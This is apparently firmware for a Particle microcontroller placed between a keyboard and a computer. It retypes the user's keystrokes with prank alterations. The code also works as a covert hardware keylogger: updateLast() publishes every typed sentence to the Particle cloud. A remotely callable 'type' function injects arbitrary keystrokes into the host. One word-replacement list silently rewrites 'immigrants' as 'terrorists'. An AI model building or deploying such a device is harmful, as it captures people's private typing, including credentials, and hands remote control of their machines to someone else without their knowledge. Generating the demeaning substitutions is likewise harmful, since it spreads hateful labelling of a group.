const char BACKSPACE = 8;
String inKey = "";
String lastWord = "";
String lastSentence = "";
char charBuf[31] = "";
int state = 0;

char consonants[] = "qwrtpsdfghjklzxcvbnm";
char milAlphabet[][32] = {
    "ALPHA",
    "BETA",
    "CHARLIE",
    "DELTA",
    "ECHO",
    "FOXTROT",
    "GOLF",
    "HOTEL",
    "INDIA",
    "JULIETT",
    "KILO",
    "LIMA",
    "MIKE",
    "NOVEMBER",
    "OSCAR",
    "PAPA",
    "QUEBEC",
    "ROMEO",
    "SIERRA",
    "TANGO",
    "UNIFORM",
    "VICTOR",
    "WHISKEY",
    "XRAY",
    "YANKEE",
    "ZULU"
};
String forbiddenWords[] = {
    "stupid",
    "facts",
    "immigrants",
    "trump"
};
String replaceWords[] = {
    "intelligent ",
    "alternative facts ",
    "terrorists ",
    "Mr President "
};

void setup() {
    Serial1.begin(250000);
    Keyboard.begin();
    Particle.function("type", receive);
}

boolean receive(String text) {
    Keyboard.print(text);
    return true;
}

void handleKey(char key) {
    switch(key) {
        case 13: sendCR(); break;
        default: sendKey(key); break;
    }
    updateLast(key);
}

void loop() {
    while (Serial1.available() > 0) {
        char recieved = Serial1.read();
        inKey += recieved;

        // Process message when new line character is recieved
        if (recieved == '\n') {
            handleKey(inKey.toInt());
            inKey = "";
        }
    }
}

void sendKey(char key) {
    switch (state) {
        case 0: replace(key); break;
        case 1: military(key); break;
        case 2: bobSaget(key); break;
        case 3: robberLang(key); break;
        default: normal(key); break;
    }
}

void sendCR() {
    state++;
    Keyboard.println();
}

void updateLast(char key) {
    if ((key == ' ' || key == 13) && lastWord != "") {
        //Particle.publish("word", lastWord, PRIVATE);
        lastWord = "";
    } else {
        lastWord += key;
    }

    if (key == 13 && lastSentence != "") {
        Particle.publish("sentence", lastSentence, PRIVATE);
        lastSentence = "";
    } else {
        lastSentence += key;
    }
}

void normal(char key) {
    Keyboard.print(key);
}

void replace(char key) {
    if (key == ' ' && inStringArray(forbiddenWords, lastWord, 4)) {
        removeLastWord();
        int replaceIndex = indexOfStringArray(forbiddenWords, lastWord, 4);
        if (replaceIndex >= 0) {
            Keyboard.print(replaceWords[replaceIndex]);
        }

    } else {
        Keyboard.print(key);
    }
}

void removeLastWord() {
    for (int i = 0; i < lastWord.length(); i++) {
        Keyboard.print(BACKSPACE);
    }
}

void bobSaget(char key) {
    Keyboard.print(key);
    if (key == ' ' && random(10) > 8) {
        Keyboard.print("BOB SAGET!! ");
    }
}

void robberLang(char key) {
    Keyboard.print(key);
    if (inCharArray(consonants, key)) {
        Keyboard.print('o');
        Keyboard.print(key);
    }
}

void military(char key) {
    if (key >= 97) {
        Keyboard.print(milAlphabet[key-97]);
    } else {
        Keyboard.print(key);
    }
}

bool inCharArray(char array[], char element) {
    for (int i = 0; i < strlen(array); i++) {
        if (array[i] == element) {
          return true;
        }
    }
    return false;
}

bool inStringArray(String array[], String element, int len) {
    for (int i = 0; i < len; i++) {
        if (element.equalsIgnoreCase(array[i])) {
          return true;
        }
    }
    return false;
}

int indexOfStringArray(String array[], String element, int len) {
    for (int i = 0; i < len; i++) {
        if (element.equalsIgnoreCase(array[i])) {
          return i;
        }
    }
    return -1;
}
